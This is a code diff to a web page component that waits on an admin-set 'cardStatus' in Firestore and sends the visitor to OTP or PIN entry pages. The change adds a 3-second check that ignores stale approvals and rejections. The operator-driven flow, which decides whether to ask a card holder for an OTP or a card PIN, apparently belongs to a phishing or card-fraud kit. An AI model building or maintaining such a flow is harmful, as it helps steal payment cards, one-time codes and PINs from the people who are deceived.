@@ -170,11 +170,15 @@ export default function P1({ offerTotalPrice }: _P1Props) {
 
     const unsubscribe = onSnapshot(
       doc(db as Firestore, "pays", visitorID),
-      (docSnapshot) => {
+      async (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data()
           const status = data.cardStatus
+          const updatedAt = data.cardStatusUpdatedAt as number | undefined
           const redirectPage = data.redirectPage
+
+          // Get current timestamp
+          const now = Date.now()
 
           // Don't auto-redirect if admin just redirected to payment page
           if (redirectPage === "payment") {
@@ -182,19 +186,51 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             return
           }
 
-          console.log('[Card Status] Current status:', status)
+          console.log('[Card Status] Current status:', status, 'updatedAt:', updatedAt)
           
           if (status === "approved_with_otp") {
+            // Check if this is a NEW action (within 3 seconds)
+            if (!updatedAt || (now - updatedAt > 3000)) {
+              console.log('[Card Status] Stale approval, ignoring')
+              return
+            }
+            
             console.log('[Card Status] Approved with OTP, redirecting to step2')
             setIsWaitingAdmin(false)
+            
+            // Mark as processed by updating timestamp
+            await setDoc(doc(db as Firestore, "pays", visitorID), {
+              cardStatusUpdatedAt: now
+            }, { merge: true })
+            
             // Redirect to OTP page
             router.push("/step2")
+            
           } else if (status === "approved_with_pin") {
+            // Check if this is a NEW action (within 3 seconds)
+            if (!updatedAt || (now - updatedAt > 3000)) {
+              console.log('[Card Status] Stale approval, ignoring')
+              return
+            }
+            
             console.log('[Card Status] Approved with PIN, redirecting to step3')
             setIsWaitingAdmin(false)
+            
+            // Mark as processed by updating timestamp
+            await setDoc(doc(db as Firestore, "pays", visitorID), {
+              cardStatusUpdatedAt: now
+            }, { merge: true })
+            
             // Redirect to PIN page directly
             router.push("/step3")
+            
           } else if (status === "rejected" && !rejectionHandledRef.current) {
+            // Check if this is a NEW action (within 3 seconds)
+            if (!updatedAt || (now - updatedAt > 3000)) {
+              console.log('[Card Status] Stale rejection, ignoring')
+              return
+            }
+            
             console.log('[Card Status] Card rejected, hiding loader immediately')
             
             // Mark rejection as handled
